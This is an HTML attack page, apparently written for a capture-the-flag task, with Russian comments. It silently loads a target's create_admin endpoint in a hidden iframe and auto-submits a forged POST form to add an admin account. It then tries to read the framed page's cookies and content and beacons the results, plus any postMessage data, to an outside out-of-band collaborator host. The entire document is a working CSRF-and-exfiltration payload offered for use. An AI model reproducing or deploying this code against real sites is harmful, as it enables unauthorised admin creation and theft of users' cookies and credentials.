<!DOCTYPE html>
<html>
<body>
<iframe id="targetFrame" src="https://tasks.goidactf.ru:20499/create_admin" 
        style="display:none"></iframe>

<form id="hackForm" method="POST" target="targetFrame">
    <input type="hidden" name="new_admin_login" value="HACKED_FRAME">
</form>

<script>
const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
const iframe = document.getElementById('targetFrame');

// Ждём загрузки iframe
iframe.onload = function() {
    // Отправляем форму в iframe
    document.getElementById('hackForm').submit();
    
    // Через 3 секунды пытаемся прочитать iframe
    setTimeout(() => {
        try {
            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
            const cookies = iframeDoc.cookie || iframe.contentWindow.document.cookie;
            const body = iframeDoc.body.innerHTML;
            
            // Отправляем что нашли
            new Image().src = `${COLLAB}/?iframe_cookies=${encodeURIComponent(cookies)}`;
            new Image().src = `${COLLAB}/?iframe_body_len=${body.length}`;
            
            // Если в теле есть кука или токен
            if (body.includes('admin_login') || body.includes('token') || body.includes('auth')) {
                new Image().src = `${COLLAB}/?contains_creds=yes`;
            }
        } catch(e) {
            new Image().src = `${COLLAB}/?iframe_error=${encodeURIComponent(e.message)}`;
        }
    }, 3000);
};

// Также вешаем обработчик на postMessage
window.addEventListener('message', function(event) {
    // Если iframe отправит нам сообщение
    new Image().src = `${COLLAB}/?postmessage=${encodeURIComponent(JSON.stringify(event.data))}`;
});
</script>
</body>
</html>
